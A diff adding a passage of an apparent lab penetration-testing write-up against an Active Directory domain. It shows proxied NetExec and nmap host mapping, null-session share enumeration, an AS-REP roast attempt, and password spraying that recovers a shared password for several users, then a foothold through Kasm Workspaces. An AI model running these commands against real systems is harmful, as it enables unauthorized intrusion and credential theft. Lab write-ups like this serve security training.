@@ -204,3 +204,112 @@ Kasm Workspaces 是一个虚拟桌面和远程办公解决方案，用于提供�
 http 172.16.20.50 8080
 ```
 
+#### <span style="color:lightgreen">Map Network Hosts</span>
+```
+https://github.com/Pennyw0rth/NetExec
+https://www.netexec.wiki/
+```
+
+```bash
+proxychains4 -q ./nxc smb 172.16.20.0/23
+SMB         172.16.21.180   445    S021M010         [*] Windows 10.0 Build 20348 x64 (name:S021M010) (domain:work.junon.vl) (signing:False) (SMBv1:False)
+SMB         172.16.21.195   445    S021M015         [*] Windows 10.0 Build 20348 x64 (name:S021M015) (domain:work.junon.vl) (signing:False) (SMBv1:False)
+SMB         172.16.21.200   445    S021M005         [*] Windows 10.0 Build 20348 x64 (name:S021M005) (domain:work.junon.vl) (signing:True) (SMBv1:False)
+SMB         172.16.21.222   445    S021M200         [*] Windows 10.0 Build 20348 x64 (name:S021M200) (domain:eu.junon.vl) (signing:True) (SMBv1:False)
+```
+172.16.21.0/24
+---
+
+```
+proxychains4 -q nmap -sT -p 22,80,88,443,445,3389,5985 172.16.21.3-254 -oA 21.txt
+
+
+172.16.21.180
+172.16.21.195
+172.16.21.200
+172.16.21.222
+172.16.21.240
+
+https://172.16.21.120/ui/
+172.16.21.120 https://172.16.21.120/ui/ ESXI
+http://172.16.21.180/  iis
+http://172.16.21.195/
+http://172.16.21.200/
+http://172.16.21.222/certsrv ADCS
+
+172.16.21.240 https://s021v010.work.junon.vl/ Bitwarden Web Vault
+```
+
+#### <span style="color:lightgreen">SSH protocol</span>
+
+```bash
+proxychains4 -q ./nxc ssh 172.16.21.3-254
+
+SSH         172.16.21.3     22     172.16.21.3      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
+SSH         172.16.21.50    22     172.16.21.50     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
+SSH         172.16.21.100   22     172.16.21.100    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
+SSH         172.16.21.240   22     172.16.21.240    [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+```
+
+#### <span style="color:lightgreen">Enumerate Null Sessions</span>
+
+```bash
+proxychains4 -q ./nxc smb 172.16.21.3-254 -u '' -p '' --shares
+```
+
+#### <span style="color:lightgreen">ASREPRoast</span>
+
+```
+proxychains4 -q crackmapexec ldap 172.16.21.200 -u usernames.txt -p '' --asreproast asrep.txt
+
+nothing
+```
+#### <span style="color:lightgreen">Password Spraying</span>
+
+```
+proxychains4 -q ./nxc smb 172.16.21.200 -u usernames.txt -p Summer2023 --continue-on-success > brute.txt
+
+
+Wutai2023
+Junon2023
+
+cat Desktop/brute.txt|grep +
+
+SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Wendy.Vincent:Summer2023
+SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Melanie.Mueller:Summer2023
+SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Terry.Lowe:Summer2023
+SMB         172.16.21.200   445    S021M005         [+] work.junon.vl\Hazel.Simpson:Summer2023
+```
+
+---
+
+#### <span style="color:lightgreen">kerbrute</span>
+
+```
+proxychains4 -q /usr/share/doc/python3-impacket/examples/GetNPUsers.py work.junon.vl/ -no-pass -usersfile usernames.txt
+
+
+```
+
+---
+
+# <span style="color:lightblue">Foothold</span>
+## <span style="color:lightgreen">Kasm Workspaces</span>
+
+```
+Terry.Lowe@work.junon.vl
+Summer2023
+```
+
+![](/assets/post_img/Wutai_Foothold.png)
+
+```powershell
+C:\Users\Hazel.Simpson>whoami
+work-junon\hazel.simpson
+
+C:\Users\Hazel.Simpson>hostname
+S021M010
+```
+
+---
+
